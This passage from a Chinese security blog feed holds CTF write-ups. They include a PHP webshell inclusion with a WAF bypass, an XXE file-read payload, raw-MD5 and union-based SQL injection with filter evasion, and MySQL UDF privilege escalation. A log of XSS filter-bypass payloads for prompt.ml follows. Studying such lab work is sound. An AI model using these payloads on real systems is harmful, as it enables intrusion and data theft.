jpg ，所以直接抓包在后面再个一句话，然后用 fopen() 去包含</p><p>但是，注意是但是，这里有个坑，不能用 &lt;?php，有 waf，要用 <script language="php">eval($_POST[1])</script></p><p>然后 page=uploads/1552805580.jpg%00 自动出 flag，都不需要菜刀</p><p>这题出的太过死板，&lt;?=?&gt; 是可以的，居然没任何回显，专考 <script language="php"> 标签了，没意义</p><p>有时间自己改一改出个题</p><h2 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h2><blockquote><p> xxe 入门</p></blockquote><p>请设法获得目标机器/home/ctf/flag.txt中的flag值。</p><p>参考 <a href="https://blog.spoock.com/2016/11/15/jarvisoj-web-writeup-1/">https://blog.spoock.com/2016/11/15/jarvisoj-web-writeup-1/</a></p><p>常规系统里对接收的请求都会做限制，比如POST之以content-type的application/x-www-form-urlencoded接收，但在一些框架系统里，框架会自动帮开发者识别传入的数据</p><p> POST 提交数据的四种常见方式</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">application</span>/x-www-form-urlencoded </span><br><span class="line">multipart/form-data</span><br><span class="line"><span class="built_in">application</span>/json</span><br><span class="line"><span class="built_in">application</span>/xml</span><br></pre></td></tr></table></figure><p>比如：默认为application/x-www-form-urlencoded接收的我只需修改为 application/json</p><p>即可传入JSON格式的数据，XML同理</p><p>这将导致原本不存在xml解析的地方可能存在XXE漏洞<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">XHR</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">var</span> xhr;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> XMLHttpRequest();&#125;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line"></span><br><span class="line">​            <span class="keyword">var</span> IEXHRVers =[<span class="string">"Msxml3.XMLHTTP"</span>,<span class="string">"Msxml2.XMLHTTP"</span>,<span class="string">"Microsoft.XMLHTTP"</span>];</span><br><span class="line"></span><br><span class="line">​            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>,len=IEXHRVers.length;i&lt; len;i++) &#123;</span><br><span class="line"></span><br><span class="line">​                <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> ActiveXObject(IEXHRVers[i]);&#125;</span><br><span class="line"></span><br><span class="line">​                <span class="keyword">catch</span>(e) &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line"></span><br><span class="line">​            &#125;</span><br><span class="line"></span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">return</span> xhr;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">​    evil_input = <span class="built_in">document</span>.getElementById(<span class="string">"evil-input"</span>).value;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">var</span> xhr = XHR();</span><br><span class="line"></span><br><span class="line">​        xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">​        xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">​            <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</span><br><span class="line"></span><br><span class="line">​                data = <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line"></span><br><span class="line">​                tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</span><br><span class="line"></span><br><span class="line">​                tip_area.value = data.task.search+data.task.value;</span><br><span class="line"></span><br><span class="line">​            &#125;</span><br><span class="line"></span><br><span class="line">​        &#125;;</span><br><span class="line"></span><br><span class="line">​        xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</span><br><span class="line"></span><br><span class="line">​        xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br></pre></td></tr></table></figure></p><p>payload:</p><p>Content-Type: application/xml</p><p>​    &lt;?xml version=”1.0” encoding=”utf-8”?&gt;</p><p>​    &lt;!DOCTYPE data[</p><p>​    &lt;!ENTITY file SYSTEM “file:////home/ctf/flag.txt”&gt;</p><p>]&gt;</p><p><data>&file;</data></p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>​    header 头里面发现 hint: “select * from <code>admin</code> where password=’”.md5($pass,true).”‘“</p><p>​    md5 ( string $str [, bool $raw_output = FALSE ] ) : string</p><p>​    string 要计算的字符串 </p><p>​    raw 为 TRUE 时为 16 字符二进制格式，默认为 false 32 字符十六进制数</p><p>​    参考 <a href="https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html">https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html</a></p><p>​        <a href="http://www.am0s.com/functions/204.html">http://www.am0s.com/functions/204.html</a></p><p>​    有个牛逼的字符串： ffifdyop</p><p>​    传入之后，最终的 sql 语句变为 select * from <code>admin</code> where password=’’or’6�]��!r,��b’</p><p>​    成功闭合，得到万能密码</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><p>​    咦，奇怪，说好的WEB题呢，怎么成逆向了？不过里面有个help_me函数挺有意思的哦</p><p>​    题目给了个 udf.so 的文件，IDA 启动，然而并没有发现啥东西（汇编还要加油</p><p>​    前几天刚看了MySQL提权就忘了，后来才知道 udf.so 也是拿来提权的，</p><p>​    <a href="http://vinc.top/2017/04/19/mysql-udf%E6%8F%90%E6%9D%83linux%E5%B9%B3%E5%8F%B0/">http://vinc.top/2017/04/19/mysql-udf%E6%8F%90%E6%9D%83linux%E5%B9%B3%E5%8F%B0/</a></p><p>​    </p><p>​    将 udf.so 导入到MySQL的插件里面，注意改下权限</p><p>​    mysql&gt; show variables like “%plugin%”;</p><p>​    +——————————-+————————+</p><p>​    | Variable_name                 | Value                  |</p><p>​    +——————————-+————————+</p><p>​    | default_authentication_plugin | mysql_native_password  |</p><p>​    | plugin_dir                    | /usr/lib/mysql/plugin/ |</p><p>​    +——————————-+————————+</p><p>​    2 rows in set (0.00 sec)</p><p>​    mysql&gt; create function help_me returns string soname ‘udf.so’;</p><p>​    Query OK, 0 rows affected (0.00 sec)</p><p>​    mysql&gt; select help_me();</p><p>​    +———————————————+</p><p>​    | help_me()                                   |</p><p>​    +———————————————+</p><p>​    | use getflag function to obtain your flag!!  |</p><p>​    +———————————————+</p><p>​    1 row in set (0.00 sec)</p><p>​    mysql&gt; create function getflag returns string soname ‘udf.so’;</p><p>​    Query OK, 0 rows affected (0.00 sec)</p><p>​    mysql&gt; select getflag();</p><p>​    +——————————————+</p><p>​    | getflag()                                |</p><p>​    +——————————————+</p><p>​    | PCTF{Interesting_U5er_d3fined_Function}  |</p><p>​    +——————————————+</p><p>​    1 row in set (0.00 sec)</p><h2 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h2><p>​    然而又是 hash 扩展攻击，不做了</p><p>​    &lt;?php </p><p>​    $auth = false;</p><p>​    $role = “guest”;</p><p>​    $salt = ‘32342’;</p><p>​    if (isset($_COOKIE[“role”])) {</p><p>​        $role = unserialize($_COOKIE[“role”]);</p><p>​        $hsh = $_COOKIE[“hsh”];</p><p>​        if ($role===”admin” &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[“role”]))) {</p><p>​            $auth = true;</p><p>​        } else {</p><p>​            $auth = false;</p><p>​        }</p><p>​    } else {</p><p>​        $s = serialize($role);</p><p>​        setcookie(‘role’,$s);</p><p>​        $hsh = md5($salt.strrev($s));</p><p>​        setcookie(‘hsh’,$hsh);</p><p>​    }</p><p>​    if ($auth) {</p><p>​        echo “<h3>Welcome Admin. Your flag is “;</p><p>​    } else {</p><p>​        echo “<h3>Only Admin can see the flag!!</h3>“;</p><p>​    }</p><p>​    ?&gt; </p><h2 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h2><p>​    &lt;?php</p><p>​        error_reporting(0);</p><p>​        echo “<!--index.phps-->“;</p><p>​        if(!$_GET[‘id’]) {</p><p>​            header(‘Location: index.php?id=1’);</p><p>​            exit();</p><p>​        }</p><p>​        $id=$_GET[‘id’];</p><p>​        $a=$_GET[‘a’];</p><p>​        $b=$_GET[‘b’];</p><p>​        if(stripos($a,’.’)) {</p><p>​            echo ‘Hahahahahaha’;</p><p>​            return ;</p><p>​        }</p><p>​        $data = @file_get_contents($a,’r’);</p><p>​        if($data==”1112 is a nice lab!” and $id==0 and strlen($b)&gt;5 </p><p>​        and eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4) {</p><p>​            require(“flag.txt”);</p><p>​        }</p><p>​        else {</p><p>​            print “work harder!harder!harder!”;</p><p>​        }</p><p>​    ?&gt;</p><p>​    payload1: index.php/?id=a&amp;a=php://input&amp;b=%0034253</p><p>​    post: 1112 is a nice lab!</p><p>​    eregi() 会被 %00 截断，但 strlen() 不会</p><p>​    ==&gt;  <!--index.phps-->�Come ON!!! {/^HT2mCpcvOLf}</p><p>​    进入该目录，自动跳转到 web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1</p><p>​    </p><p>​    发现空格被过滤，尝试绕过</p><p>​    - 使用注释绕过，/**/</p><p>​    - 使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用（）包围，并且两端可以没有多余的空格</p><p>​    - 使用符号替代空格 %20 %09 %0d %0b %0c %0d %a0 %0a</p><p>​    这里可以用 /<em>233</em>/ 代替空格</p><p>​    </p><p>​    order by 没有回显，放弃该法</p><p>​    /?id=2/<em>233</em>/uunionnion/<em>233</em>/seselectlect/<em>233</em>/1,2,3%23</p><p>​    得到 3， 说明字段数也是 3</p><p>​    payload2: </p><p>​    获取所有数据库名</p><p>​    ?id=2/<em>233</em>/uniounionn/<em>233</em>/selselectect/<em>233</em>/1,2,group_concat(schema_name)/<em>233</em>/frfromom/<em>233</em>/information_schema.schemata%23</p><p>​    ==&gt; information_schema,test</p><p>​    获取本数据库内的所有表名</p><p>​    ?id=2/<em>233</em>/uniounionn/<em>233</em>/selselectect/<em>233</em>/1,2,group_concat(table_name)/<em>233</em>/frfromom/<em>233</em>/information_schema.tables/<em>233</em>/where/<em>233</em>/table_schema=database()%23</p><p>​    ==&gt; content</p><p>​    （以上两步可省略）</p><p>​    获取所有字段名</p><p>​    ?id=2/<em>233</em>/uniounionn/<em>233</em>/selselectect/<em>233</em>/1,2,group_concat(column_name)/<em>233</em>/frfromom/<em>233</em>/information_schema.columns/<em>233</em>/where/<em>233</em>/table_name=0x636f6e74656e74%23</p><p>​    ==&gt; id,context,title</p><p>​    获取所有数据</p><p>​    ?id=2/<em>233</em>/uniounionn/<em>233</em>/selselectect/<em>233</em>/1,2,group_concat(id,context,title)/<em>233</em>/frfromom/<em>233</em>/content%23</p><p>​    ==&gt; 1PCTF{Fin4lly_U_got_i7_C0ngRatulation5}hi666</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>​    是一个输入框，输入密码，显示密码错误</p><p>​    扫不到其他目录，看看源码，有个 app.js </p><p>​    搜索 Wrong Password!!</p><p>​    $.post(“checkpass.json”, t,</p><p>​    function(t) {</p><p>​        self.checkpass(e) ? self.setState({</p><p>​            errmsg: “Success!!”,</p><p>​            errcolor: b.green400</p><p>​        }) : (self.setState({</p><p>​            errmsg: “Wrong Password!!”</p><p>​            ……</p><p>​        }))</p><p>​    })</p><p>​    跟进去</p><p>​    function(e) {</p><p>​        if (25 !== e.length) return ! 1;</p><p>​        for (var t = [], n = 0; n &lt; 25; n++) t.push(e.charCodeAt(n));</p><p>​        for (var r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259], o = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]], n = 0; n &lt; 25; n++) {</p><p>​            for (var i = 0, a = 0; a &lt; 25; a++) i += t[a] * o[n][a];</p><p>​            if (i !== r[n]) return ! 1</p><p>​        }</p><p>​        return ! 0</p><p>​    }</p><p>​    变成了一个数学题，解线性方程组</p><p>​    import numpy as np</p><p>​    o = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]]</p><p>​    r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259]</p><p>​    o = np.array(o)</p><p>​    r = np.array(r)</p><p>​    x = np.linalg.solve(o,r)</p><p>​    res = ‘’</p><p>​    for i in x:</p><p>​        res += chr(int(str(i)[0:-2]))</p><p>​    print(res)</p></script></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PORT-51&quot;&gt;&lt;a href=&quot;#PORT-51&quot; class=&quot;headerlink&quot; title=&quot;PORT 51&quot;&gt;&lt;/a&gt;PORT 51&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Prompt 1 to win 通关记录</title>
    <link href="https://wywwzjj.top/2019/02/01/Prompt-1-xss-%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <id>https://wywwzjj.top/2019/02/01/Prompt-1-xss-通关记录/</id>
    <published>2019-02-01T01:05:44.000Z</published>
    <updated>2019-05-15T16:27:35.238Z</updated>
    
    <content type="html"><![CDATA[<p>平台地址：<a href="http://prompt.ml/" target="_blank" rel="noopener"><a href="http://prompt.ml/" target="_blank" rel="noopener">http://prompt.ml/</a></a></p><h2 id="0-轻松的开始"><a href="#0-轻松的开始" class="headerlink" title="0. 轻松的开始"></a>0. 轻松的开始</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// warm up</span></span><br><span class="line">    <span class="comment">// script should be executed without user interaction</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input type="text" value="'</span> + input + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;';&lt;script&gt;prompt(1)&lt;/script&gt;&gt;</span></span><br><span class="line"><span class="string">"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">prompt(1)</span>&gt;</span></span></span><br><span class="line">"&gt;&lt;img src="x" onerror=prompt(1)&gt;</span><br><span class="line"></span><br><span class="line">"onresize=prompt(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// tags stripping mechanism from ExtJS library</span></span><br><span class="line">    <span class="comment">// Ext.util.Format.stripTags</span></span><br><span class="line">    <span class="keyword">var</span> stripTagsRE = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span>;</span><br><span class="line">    input = input.replace(stripTagsRE, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;article&gt;'</span> + input + <span class="string">'&lt;/article&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>/&lt;\/?[^&gt;]+&gt;/gi</code> 限定了 <code>gi</code> 意味着大小写和双写是绕不过的</p><p>（或许可以参考 <a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a> 做法，但是没多大意义）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=prompt(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//v-- frowny face</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[=(]/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// ok seriously, disallows equal signs and open parenthesis</span></span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">( 用 html 实体编码绕过</span><br><span class="line"><span class="comment">// Firefox</span></span><br><span class="line">&lt;svg&gt;&lt;script&gt;prompt&amp;#x28;1)&lt;b&gt;</span><br><span class="line">// Chrome</span><br><span class="line">&lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="3-注释符"><a href="#3-注释符" class="headerlink" title="3. 注释符"></a>3. 注释符</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential comment end delimiters</span></span><br><span class="line">    input = input.replace(<span class="regexp">/-&gt;/g</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// comment the input to avoid script execution</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--&gt; 和 --!&gt; 都能闭合注释</span><br><span class="line">--!&gt;<span class="xml"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">prompt(1)</span></span></span></span><br></pre></td></tr></table></figure><h2 id="4-假同域"><a href="#4-假同域" class="headerlink" title="4. 假同域"></a>4. 假同域</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// make sure the script belongs to own site</span></span><br><span class="line">    <span class="comment">// sample script: http://prompt.ml/js/test.js</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^(?:https?:)?\/\/prompt\.ml\//i</span></span><br><span class="line">        .test(<span class="built_in">decodeURIComponent</span>(input))) &#123;</span><br><span class="line">        <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">        script.src = input;</span><br><span class="line">        <span class="keyword">return</span> script.outerHTML;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid resource.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">只能引用 prompt.ml 下的 js</span><br><span 